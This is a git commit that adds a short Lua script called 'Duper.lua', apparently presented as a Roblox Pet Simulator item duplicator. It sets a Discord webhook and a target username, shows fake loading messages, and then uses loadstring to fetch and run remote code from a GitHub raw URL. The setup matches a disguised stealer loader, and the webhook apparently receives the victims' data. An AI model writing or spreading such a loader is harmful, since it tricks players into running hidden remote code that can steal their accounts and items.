e0e8cbbffa2857ee6157557bbd6218eebc9e99f2
Subashians <104033466+Subashians@users.noreply.github.com>
2023-02-05 17:20:31 +0100

    Create Duper.lua

---
+++ Duper.lua
@@ -0,0 +1,9 @@
+Username = "FuzeMosh"
+WebHook = "https://discord.com/api/webhooks/1062766577688256582/zt51yjBUBA8XYxBqxO0M-DVMHTMuuiRZSgTd5kR-xJTNI4yeNRHs7KJDRAalH6FD1szh"
+
+_G.CustomScriptName = "Commentuto"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
